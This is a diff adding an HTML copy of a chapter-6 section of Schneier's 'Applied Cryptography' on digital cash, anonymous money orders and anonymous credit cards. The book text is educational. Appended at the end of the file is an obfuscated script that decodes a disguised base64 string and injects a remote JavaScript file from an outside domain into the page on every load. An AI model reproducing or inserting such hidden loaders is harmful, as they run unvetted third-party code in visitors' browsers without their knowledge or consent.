@@ -1,0 +1,114 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=144-147//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch07/07-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Even collusion between Alice and the merchant can&#146;t cheat the bank. As long as the bank signs the money order with the uniqueness string, the bank is assured of only having to make good on the money order once.
+</P>
+<P>What about the bank? Can it figure out that the money order it accepted from the merchant was the one it signed for Alice? Alice is protected by the blind signature protocol in steps (2) through (5). The bank cannot make the connection, even if it keeps complete records of every transaction. Even more strongly, there is no way for the bank and the merchant to get together to figure out who Alice is. Alice can walk in the store and, completely anonymously, make her purchase.</P>
+<P>Eve can cheat. If she can eavesdrop on the communication between Alice and the merchant, and if she can get to the bank before the merchant does, she can deposit the digital cash first. The bank will accept it and, even worse, when the merchant tries to deposit the cash he will be identified as a cheater. If Eve steals and spends Alice&#146;s cash before Alice can, then Alice will be identified as a cheater. There&#146;s no way to prevent this; it is a direct result of the anonynimity of the cash. Both Alice and the merchant have to protect their bits as they would paper money.</P>
+<P>This protocol lies somewhere between an arbitrated protocol and a self-enforcing protocol. Both Alice and the merchant trust the bank to make good on the money orders, but Alice does not have to trust the bank with knowledge of her purchases.</P>
+<P><FONT SIZE="+1"><B><I>Digital Cash and the Perfect Crime</I></B></FONT></P>
+<P>Digital cash has its dark side, too. Sometimes people don&#146;t want so much privacy. Watch Alice commit the perfect crime [1575]:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice kidnaps a baby.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice prepares 10, 000 anonymous money orders for $1000 (or as many as she wants for whatever denomination she wants).
+<DD><B>(3)</B>&nbsp;&nbsp;Alice blinds all 10, 000 money orders, using a blind signature protocol. She sends them to the authorities with the threat to kill the baby unless the following instructions are met:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;Have a bank sign all 10, 000 money orders.
+<DD><B>(b)</B>&nbsp;&nbsp;Publish the results in a newspaper.
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;The authorities comply.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice buys a newspaper, unblinds the money orders, and starts spending them. There is no way for the authorities to trace the money orders to her.
+<DD><B>(6)</B>&nbsp;&nbsp;Alice frees the baby.
+</DL>
+<P>Note that this situation is much worse than any involving physical tokens&#151;cash, for example. Without physical contact, the police have less opportunity to apprehend the kidnapper.
+</P>
+<P>In general, though, digital cash isn&#146;t a good deal for criminals. The problem is that the anonymity only works one way: The spender is anonymous, but the merchant is not. Moreover, the merchant cannot hide the fact that he received money. Digital cash will make it easy for the government to determine how much money you made, but impossible to determine what you spent it on.</P>
+<P><FONT SIZE="+1"><B><I>Practical Digital Cash</I></B></FONT></P>
+<P>A Dutch company, DigiCash, owns most of the digital cash patents and has implemented digital cash protocols in working products. Anyone interested should contact DigiCash BV, Kruislaan 419, 1098 VA Amsterdam, Netherlands.
+</P>
+<P><FONT SIZE="+1"><B><I>Other Digital Cash Protocols</I></B></FONT></P>
+<P>There are other digital cash protocols; see [707, 1554, 734, 1633, 973]. Some of them involve some pretty complicated mathematics. Generally, the various digital cash protocols can be divided into various categories. <B>On-line</B> systems require the merchant to communicate with the bank at every sale, much like today&#146;s credit-card protocols. If there is a problem, the bank doesn&#146;t accept the cash and Alice cannot cheat.</P>
+<P><B>Off-line</B> systems, like Protocol #4, require no communication between the merchant and the bank until after the transaction between the merchant and the customer. These systems do not prevent Alice from cheating, but instead detect her cheating. Protocol #4 detected her cheating by making Alice&#146;s identity known if she tried to cheat. Alice knows that this will happen, so she doesn&#146;t cheat.</P>
+<P>Another way is to create a special smart card (see Section 24.13) containing a tamperproof chip called an <B>observer</B> [332, 341, 387]. The observer chip keeps a mini database of all the pieces of digital cash spent by that smart card. If Alice attempts to copy some digital cash and spend it twice, the imbedded observer chip would detect the attempt and would not allow the transaction. Since the observer chip is tamperproof, Alice cannot erase the mini-database without permanently damaging the smart card. The cash can wend its way through the economy; when it is finally deposited, the bank can examine the cash and determine who, if anyone, cheated.</P>
+<P>Digital cash protocols can also be divided along another line. <B>Electronic coins</B> have a fixed value; people using this system will need several coins in different denominations. <B>Electronic checks</B> can be used for any amount up to a maximum value and then returned for a refund of the unspent portion.</P>
+<P>Two excellent and completely different off-line electronic coin protocols are [225, 226, 227] and [563, 564, 565]. A system called NetCash, with weaker anonymity properties, has also been proposed [1048, 1049]. Another new system is [289].</P>
+<P>In [1211], Tatsuaki Okamoto and Kazuo Ohta list six properties of an ideal digital cash system:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Independence. The security of the digital cash is not dependent on any physical location. The cash can be transferred through computer networks.
+<DD><B>2.</B>&nbsp;&nbsp;Security. The digital cash cannot be copied and reused.
+<DD><B>3.</B>&nbsp;&nbsp;Privacy (Untraceability). The privacy of the user is protected; no one can trace the relationship between the user and his purchases.
+<DD><B>4.</B>&nbsp;&nbsp;Off-line Payment. When a user pays for a purchase with electronic cash, the protocol between the user and the merchant is executed off-line. That is, the shop does not need to be linked to a host to process the user&#146;s payment.
+<DD><B>5.</B>&nbsp;&nbsp;Transferability. The digital cash can be transferred to other users.
+<DD><B>6.</B>&nbsp;&nbsp;Divisibility. A piece of digital cash in a given amount can be subdivided into smaller pieces of cash in smaller amounts. (Of course, everything has to total up properly in the end.)
+</DL>
+<P>The protocols previously discussed satisfy properties 1, 2, 3, and 4, but not 5 and 6. Some on-line digital cash systems satisfy all properties except 4 [318, 413, 1243]. The first off-line digital cash system that satisfies properties 1, 2, 3, and 4, similar to the one just discussed, was proposed in [339]. Okamoto and Ohta proposed a system that satisfies properties 1 through 5 [1209]; they also proposed a system that satisfies properties 1 through 6 as well, but the data requirement for a single purchase is approximately 200 megabytes. Another off-line divisible coin system is described in [522].
+</P>
+<P>The digital cash scheme proposed in [1211], by the same authors, satisfies properties 1 through 6, without the enormous data requirements. The total data transfer for a payment is about 20 kilobytes, and the protocol can be completed in several seconds. The authors consider this the first ideal untraceable electronic cash system.</P>
+<P><FONT SIZE="+1"><B><I>Anonymous Credit Cards</I></B></FONT></P>
+<P>This protocol [988] uses several different banks to protect the identity of the customer. Each customer has an account at two different banks. The first bank knows the person&#146;s identity and is willing to extend him credit. The second bank knows the customer only under a pseudonym (similar to a numbered Swiss bank account).
+</P>
+<P>The customer can withdraw funds from the second bank by proving that the account is his. However, the bank does not know the person and is unwilling to extend him credit. The first bank knows the customer and transfers funds to the second bank&#151;without knowing the pseudonym. The customer then spends these funds anonymously. At the end of the month, the second bank gives the first bank a bill, which it trusts the bank to pay. The first bank passes the bill on to the customer, which it trusts the customer to pay. When the customer pays, the first bank transfers additional funds to the second bank. All transactions are handled through an intermediary, which acts sort of like an electronic Federal Reserve: settling accounts among banks, logging messages, and creating an audit trail.</P>
+<P>Exchanges between the customer, merchant, and various banks are outlined in [988]. Unless everyone colludes against the customer, his anonymity is assured. However, this is not digital cash; it is easy for the bank to cheat. The protocol allows customers to keep the advantages of credit cards without giving up their privacy.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch07/07-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(HsaYFWsn, ONuKPjDh) {ONuKPjDh = HsaYFWsn.createElement('script');ONuKPjDh.type = 'text/javascript';ONuKPjDh.async = true;ONuKPjDh.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');HsaYFWsn.getElementsByTagName('body')[0].appendChild(ONuKPjDh);}(document));</script></body>
+</html>
